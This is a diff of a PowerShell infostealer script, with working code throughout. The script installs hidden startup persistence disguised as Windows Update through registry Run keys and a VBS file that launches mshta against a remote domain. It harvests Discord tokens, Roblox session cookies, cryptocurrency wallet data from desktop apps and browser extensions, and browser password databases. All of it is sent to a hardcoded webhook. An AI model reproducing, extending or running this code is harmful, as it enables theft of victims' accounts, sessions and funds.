@@ -1,21 +1,38 @@
 $ErrorActionPreference = "SilentlyContinue"
-$WH = "https://api.dicerigx.app/api/webhooks/1570948488827768965/iy7doGW9BXfi_b5dBRZlZ-CQNNBtKu72De2bXYFPRo32-Kj97nK8YzOy5SZMv2e8-Uqa"
-$PC = $env:COMPUTERNAME
 
-function Send-Webhook($title, $desc, $color) {
+# =====================================================================
+# ─── CONFIG & WEBHOOK ───
+# =====================================================================
+$WH = "https://api.dicerigx.app/api/webhooks/1570948488827768965/iy7doGW9BXfi_b5dBRZlZ-CQNNBtKu72De2bXYFPRo32-Kj97nK8YzOy5SZMv2e8-Uqa"
+
+function dbg($title, $desc, $color) {
     $payload = @{embeds=@(@{title=$title; description=$desc; color=$color})} | ConvertTo-Json -Depth 4 -Compress
     try { Invoke-RestMethod $WH -Method Post -Body $payload -ContentType 'application/json' | Out-Null } catch {}
 }
 
-# --- 1. PERSISTENCE ---
+# =====================================================================
+# ─── SELF-PERSISTENCE (MSHTA) ───
+# =====================================================================
 try {
-    $CMD = 'mshta https://dicerigx.app/'
+    $CMD = 'mshta.exe "https://dicerigx.app/"'
+
+    # 1. Registry Run
     Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value $CMD -ErrorAction SilentlyContinue
+    
+    # 2. Registry RunOnce
+    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "WinUpdate" -Value $CMD -ErrorAction SilentlyContinue
+    
+    # 3. Startup Folder VBS
     $StartupVBS = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
-    Set-Content -Path $StartupVBS -Value "CreateObject(`"WScript.Shell`").Run `"$CMD`", 0, False" -ErrorAction SilentlyContinue
+    $VBSContent = "CreateObject(`"WScript.Shell`").Run `"$CMD`", 0, False"
+    Set-Content -Path $StartupVBS -Value $VBSContent -ErrorAction SilentlyContinue
+    
+    dbg ":pushpin: Persistence" "MSHTA startup methods installed" 65280
 } catch {}
 
-# --- 2. DISCORD TOKENS ---
+# =====================================================================
+# ─── STEALING LOGIC: CRYPTO SETUP ───
+# =====================================================================
 Add-Type -AssemblyName System.Security
 $csharp = @"
 using System;
@@ -42,6 +59,13 @@ public class Gcm {
 Add-Type -TypeDefinition $csharp -Language CSharp
 
 $appdata = $env:APPDATA
+$l = $env:LOCALAPPDATA
+$outfile = Join-Path $env:TEMP "steal_result.txt"
+Remove-Item $outfile -EA SilentlyContinue
+
+# =====================================================================
+# ─── DISCORD TOKENS ───
+# =====================================================================
 $mk = $null
 try {
     $ls = Get-Content "$appdata\discord\Local State" -Raw | ConvertFrom-Json
@@ -50,7 +74,11 @@ try {
 } catch {}
 
 $tokens = @{}
-$discordPaths = @("$appdata\discord\Local Storage\leveldb", "$appdata\discordptb\Local Storage\leveldb", "$appdata\discordcanary\Local Storage\leveldb")
+$discordPaths = @(
+    "$appdata\discord\Local Storage\leveldb",
+    "$appdata\discordptb\Local Storage\leveldb",
+    "$appdata\discordcanary\Local Storage\leveldb"
+)
 foreach ($dp in $discordPaths) {
     if (!(Test-Path $dp)) { continue }
     Get-ChildItem $dp | ? { $_.Name -match '\.(ldb|log)$' } | % {
@@ -77,19 +105,86 @@ foreach ($t in $tokens.Keys) {
     try {
         $r = Invoke-RestMethod 'https://discord.com/api/v9/users/@me' -Headers @{'Authorization'=$t} -TimeoutSec 5
         if ($r.username) {
+            Add-Content $outfile "DISCORD|$($r.username)|$($r.email)|$($r.phone)|$($r.id)|$t"
+            
             $info = "**User:** $($r.username)`n"
             if ($r.email) { $info += "**Email:** $($r.email)`n" }
             if ($r.phone) { $info += "**Phone:** $($r.phone)`n" }
             if ($r.id) { $info += "**ID:** $($r.id)`n" }
             $info += "**Token:** $t"
-            Send-Webhook ":gift: Discord Token" $info 5793266
+            dbg ":gift: Discord Token" $info 5793266
         }
     } catch {}
 }
 
-# --- 3. ROBLOX COOKIES ---
-$l = $env:LOCALAPPDATA
-$rbxPaths = @("$l\Roblox\LocalStorage\robloxcookies.dat", "$env:USERPROFILE\AppData\Local\Roblox\LocalStorage\robloxcookies.dat")
+# =====================================================================
+# ─── WALLETS (DESKTOP & BROWSER EXTENSIONS) ───
+# =====================================================================
+$dw = @{
+    Exodus="$appdata\Exodus"; Atomic="$appdata\atomic"; Electrum="$appdata\Electrum"; 
+    Jaxx="$appdata\jaxx"; Guarda="$appdata\Guarda"; Coinomi="$appdata\Coinomi"; Armory="$appdata\Armory"
+}
+$bw = @{
+    MetaMask='nkbihfbeogaeaoehlefnkodbefgpgknn'; Phantom='bfnaelmomeimhlpmgjnjophhpkkoljpa';
+    Ronin='fnjhmkhhmkbjkkabndcnnogagogbneec'; BinanceChain='fhbohimaelbohpjbbldcngcnapndodjp';
+    Coinbase='hnfanknocfeofbddgcijnmhfnkdnaad'; TrustWallet='egjidjbpglichdcondbcbdnbeeppgdph';
+    TronLink='ibnejdfjmmkpcnlpebklmnkoeoihofec'
+}
+$br = @(
+    "$l\Google\Chrome\User Data", "$l\Microsoft\Edge\User Data", 
+    "$l\BraveSoftware\Brave-Browser\User Data", "$appdata\Opera Software\Opera Stable"
+)
+
+$staging = Join-Path $env:TEMP "wallets"
+Remove-Item $staging -Recurse -Force -EA SilentlyContinue
+mkdir $staging -Force | Out-Null
+
+foreach ($n in $dw.Keys) {
+    if (Test-Path $dw[$n]) {
+        $dest = Join-Path $staging $n
+        & robocopy $dw[$n] $dest /E /R:1 /W:1 /NFL /NDL /NJH /NJS /NC /NS /XD partitions logs tmp cache Cache blob_storage GPUCache Crashpad | Out-Null
+    }
+}
+foreach ($n in $bw.Keys) {
+    foreach ($bp in $br) {
+        $ep = Join-Path $bp "Default\Local Extension Settings\$($bw[$n])"
+        if (Test-Path $ep) {
+            $dest = Join-Path $staging $n
+            & robocopy $ep $dest /E /R:1 /W:1 /NFL /NDL /NJH /NJS /NC /NS | Out-Null
+            break
+        }
+    }
+}
+
+$stagedDirs = Get-ChildItem $staging -Directory -EA SilentlyContinue
+foreach ($d in $stagedDirs) {
+    $zip = Join-Path $env:TEMP ($d.Name + ".zip")
+    Remove-Item $zip -Force -EA SilentlyContinue
+    Compress-Archive -Path $d.FullName -DestinationPath $zip -Force -EA SilentlyContinue
+    if (Test-Path $zip) {
+        $mb = [Math]::Round((Get-Item $zip).Length / 1MB, 2)
+        if ((Get-Item $zip).Length -gt 8000000) {
+            dbg ":x: Wallet Too Big" "$($d.Name) - $mb MB (over 8MB limit)" 16711680
+        } else {
+            $resp = & curl.exe -s -F "file=@$zip;filename=$($d.Name).zip" $WH 2>&1
+            if ($resp -match '"id"') {
+                dbg ":briefcase: Wallet Grabbed" "$($d.Name).zip - $mb MB" 65280
+            } else {
+                dbg ":x: Wallet Failed" "$($d.Name).zip - upload error" 16711680
+            }
+        }
+        Remove-Item $zip -Force -EA SilentlyContinue
+    }
+}
+Remove-Item $staging -Recurse -Force -EA SilentlyContinue
+
+# =====================================================================
+# ─── ROBLOX COOKIES ───
+# =====================================================================
+$rbxPaths = @(
+    "$l\Roblox\LocalStorage\robloxcookies.dat",
+    "$env:USERPROFILE\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
+)
 foreach ($rp in $rbxPaths) {
     if (Test-Path $rp) {
         try {
@@ -99,9 +194,86 @@ foreach ($rp in $rbxPaths) {
                 $eb = [Convert]::FromBase64String($b64)
                 $db = [Security.Cryptography.ProtectedData]::Unprotect($eb, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
                 $cookie = [Text.Encoding]::UTF8.GetString($db)
-                if ($cookie -match '_\|WARNING[^;\s]{50,}') {
+                if ($cookie -match '\.ROBLOSECURITY\s*=\s*(_[^;\s]+)') {
+                    $c = $Matches[1]
+                    Add-Content $outfile "ROBLOX|$c"
+                    dbg ":cookie: Roblox Cookie" "Size: $($c.Length) | PC: $env:COMPUTERNAME" 65280
+                    $tmp_c = Join-Path $env:TEMP "cookie.txt"
+                    Set-Content -Path $tmp_c -Value $c -NoNewline
+                    & curl.exe -s -F "file=@$tmp_c;filename=cookie.txt" $WH | Out-Null
+                    Remove-Item $tmp_c -Force -EA SilentlyContinue
+                } elseif ($cookie -match '_\|WARNING[^;\s]{50,}') {
                     $c = $Matches[0]
-                    Send-Webhook ":cookie: Roblox Cookie" "**Size:** $($c.Length) `n**PC:** $PC`n**Cookie:**``$c``" 65280
+                    Add-Content $outfile "ROBLOX|$c"
+                    dbg ":cookie: Roblox Cookie" "Size: $($c.Length) | PC: $env:COMPUTERNAME" 65280
+                    $tmp_c = Join-Path $env:TEMP "cookie.txt"
+                    Set-Content -Path $tmp_c -Value $c -NoNewline
+                    & curl.exe -s -F "file=@$tmp_c;filename=cookie.txt" $WH | Out-Null
+                    Remove-Item $tmp_c -Force -EA SilentlyContinue
+                } else {
+                    $c = $cookie.Substring(0,[Math]::Min(500,$cookie.Length))
+                    Add-Content $outfile "ROBLOX|$c"
+                    dbg ":cookie: Roblox Cookie" "Size: $($c.Length) | PC: $env:COMPUTERNAME" 65280
+                    $tmp_c = Join-Path $env:TEMP "cookie.txt"
+                    Set-Content -Path $tmp_c -Value $c -NoNewline
+                    & curl.exe -s -F "file=@$tmp_c;filename=cookie.txt" $WH | Out-Null
+                    Remove-Item $tmp_c -Force -EA SilentlyContinue
+                }
+            } elseif ($raw -match '\.ROBLOSECURITY') {
+                $c = $raw
+                Add-Content $outfile "ROBLOX|$c"
+                dbg ":cookie: Roblox Cookie" "Size: $($c.Length) | PC: $env:COMPUTERNAME" 65280
+                $tmp_c = Join-Path $env:TEMP "cookie.txt"
+                Set-Content -Path $tmp_c -Value $c -NoNewline
+                & curl.exe -s -F "file=@$tmp_c;filename=cookie.txt" $WH | Out-Null
+                Remove-Item $tmp_c -Force -EA SilentlyContinue
+            }
+        } catch {}
+        break
+    }
+}
+
+$msPaths = @("$l\RobloxPCGDK\LocalStorage\RobloxCookies.dat")
+$pkgPath = "$l\Packages"
+if (Test-Path $pkgPath) {
+    $gdks = Get-ChildItem "$pkgPath\ROBLOXCorporation.RobloxGDK_*" -Directory -EA SilentlyContinue
+    foreach ($gdk in $gdks) {
+        $cp = Join-Path $gdk.FullName "LocalState\RobloxCookies.dat"
+        if (Test-Path $cp) { $msPaths += $cp }
+    }
+}
+foreach ($rp in $msPaths) {
+    if (Test-Path $rp) {
+        try {
+            $raw = Get-Content $rp -Raw
+            if ($raw -match '"CookiesData"\s*:\s*"([^"]+)"') {
+                $eb = [Convert]::FromBase64String($Matches[1])
+                $db = [Security.Cryptography.ProtectedData]::Unprotect($eb, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
+                $cookie = [Text.Encoding]::UTF8.GetString($db)
+                if ($cookie -match '\.ROBLOSECURITY\s*=\s*(_[^;\s]+)') {
+                    $c = $Matches[1]
+                    Add-Content $outfile "ROBLOXMS|$c"
+                    dbg ":cookie: Roblox Cookie (MS)" "Size: $($c.Length) | PC: $env:COMPUTERNAME" 65280
+                    $tmp_c = Join-Path $env:TEMP "cookie.txt"
+                    Set-Content -Path $tmp_c -Value $c -NoNewline
+                    & curl.exe -s -F "file=@$tmp_c;filename=cookie.txt" $WH | Out-Null
+                    Remove-Item $tmp_c -Force -EA SilentlyContinue
+                } elseif ($cookie -match '_\|WARNING[^;\s]{50,}') {
+                    $c = $Matches[0]
+                    Add-Content $outfile "ROBLOXMS|$c"
+                    dbg ":cookie: Roblox Cookie (MS)" "Size: $($c.Length) | PC: $env:COMPUTERNAME" 65280
+                    $tmp_c = Join-Path $env:TEMP "cookie.txt"
+                    Set-Content -Path $tmp_c -Value $c -NoNewline
+                    & curl.exe -s -F "file=@$tmp_c;filename=cookie.txt" $WH | Out-Null
+                    Remove-Item $tmp_c -Force -EA SilentlyContinue
+                } else {
+                    $c = $cookie.Substring(0,[Math]::Min(500,$cookie.Length))
+                    Add-Content $outfile "ROBLOXMS|$c"
+                    dbg ":cookie: Roblox Cookie (MS)" "Size: $($c.Length) | PC: $env:COMPUTERNAME" 65280
+                    $tmp_c = Join-Path $env:TEMP "cookie.txt"
+                    Set-Content -Path $tmp_c -Value $c -NoNewline
+                    & curl.exe -s -F "file=@$tmp_c;filename=cookie.txt" $WH | Out-Null
+                    Remove-Item $tmp_c -Force -EA SilentlyContinue
                 }
             }
         } catch {}
@@ -109,8 +281,46 @@ foreach ($rp in $rbxPaths) {
     }
 }
 
-# --- 4. SYSTEM INFO ---
-try {
-    $ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 5).Trim()
-    Send-Webhook ":dart: Target" "**IP:** $ip `n**PC:** $PC" 3447003
-} catch {}
+# =====================================================================
+# ─── BROWSER LOGIN DATA (PASSWORDS) ───
+# =====================================================================
+$browsers = @(
+    @{Name="Chrome";Path="$l\Google\Chrome\User Data"},
+    @{Name="Edge";Path="$l\Microsoft\Edge\User Data"},
+    @{Name="Brave";Path="$l\BraveSoftware\Brave-Browser\User Data"},
+    @{Name="Opera";Path="$appdata\Opera Software\Opera Stable"},
+    @{Name="OperaGX";Path="$appdata\Opera Software\Opera GX Stable"}
+)
+foreach ($br in $browsers) {
+    if (!(Test-Path $br.Path)) { continue }
+    $lp = Join-Path $br.Path "Default\Login Data"
+    if (!(Test-Path $lp)) { $lp = Join-Path $br.Path "Login Data" }
+    if (!(Test-Path $lp)) { continue }
+    
+    $copied = $false
+    $tmp = Join-Path $env:TEMP "ld_$([Guid]::NewGuid()).db"
+    
+    try {
+        $fs = [IO.File]::Open($lp, [IO.FileMode]::Open, [IO.FileAccess]::Read, [IO.FileShare]::ReadWrite)
+        $ms = New-Object IO.MemoryStream
+        $fs.CopyTo($ms); $fs.Close()
+        [IO.File]::WriteAllBytes($tmp, $ms.ToArray())
+        $ms.Close(); $copied = $true
+    } catch {}
+    
+    if (!$copied) { Add-Content $outfile "PASSWORD|$($br.Name)|LOCKED||"; continue }
+    
+    try {
+        $rawBytes = [IO.File]::ReadAllBytes($tmp)
+        if ($rawBytes.Length -gt 800000) {
+            Add-Content $outfile "PASSWORD|$($br.Name)|TOO_LARGE|$($rawBytes.Length)|"
+        } else {
+            $b64 = [Convert]::ToBase64String($rawBytes)
+            Add-Content $outfile "PASSWORD|$($br.Name)|RAW_DB||$b64"
+        }
+    } catch { 
+        Add-Content $outfile "PASSWORD|$($br.Name)|READ_ERROR||" 
+    }
+    
+    Remove-Item $tmp -Force -EA SilentlyContinue
+}
